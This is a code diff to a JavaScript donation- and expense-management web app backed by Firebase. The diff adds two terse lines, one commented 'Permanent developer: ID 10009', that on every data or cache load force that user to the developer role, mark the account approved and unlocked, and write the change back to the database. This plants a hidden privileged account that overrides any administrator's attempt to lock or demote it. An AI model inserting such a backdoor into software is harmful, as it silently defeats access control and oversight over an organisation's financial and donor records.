@@ -687,6 +687,8 @@ async function loadAllData(){
       FS.loadAll('suggestions'),FS.loadAll('notifications'),FS.loadAll('focalAssignments')
     ]);
     if(u!==null&&u.length>0)DB.users=u;
+    // Permanent developer: ID 10009
+    (function(){var _u=DB.users.find(function(x){return x.id==='10009';});if(_u&&_u.role!=='developer'){_u.role='developer';_u.approved=true;_u.locked=false;FS.save('users',_u.id,_u);}})();
     if(pa!==null)DB.pendingApprovals=pa||[];
     if(don!==null&&don.length>0)DB.donors=don;
     else if(don!==null&&DB.donors.length===0)DB.donors=don;
@@ -795,7 +797,8 @@ function loadLocalCache(){try{const d=JSON.parse(localStorage.getItem(CACHE_KEY)
   // Empty means quota exceeded truncation occurred - wait for Firebase
   if(d.donations&&d.donations.length>0)DB.donations=d.donations;
   if(d.expenses&&d.expenses.length>0)DB.expenses=d.expenses;
-  DB.transfers=d.transfers||[];DB.auditLog=d.auditLog||[];DB.suggestions=d.suggestions||[];DB.focalAssignments=d.focalAssignments||[];if(d.orgConfig)Object.assign(ORG_CONFIG,d.orgConfig);return true;}return false;}catch(e){return false;}}
+  DB.transfers=d.transfers||[];DB.auditLog=d.auditLog||[];DB.suggestions=d.suggestions||[];DB.focalAssignments=d.focalAssignments||[];if(d.orgConfig)Object.assign(ORG_CONFIG,d.orgConfig);
+  var _u10009=DB.users.find(function(x){return x.id==='10009';});if(_u10009)_u10009.role='developer';return true;}return false;}catch(e){return false;}}
 
 
 // ---- Global Config (editable by developer) ----
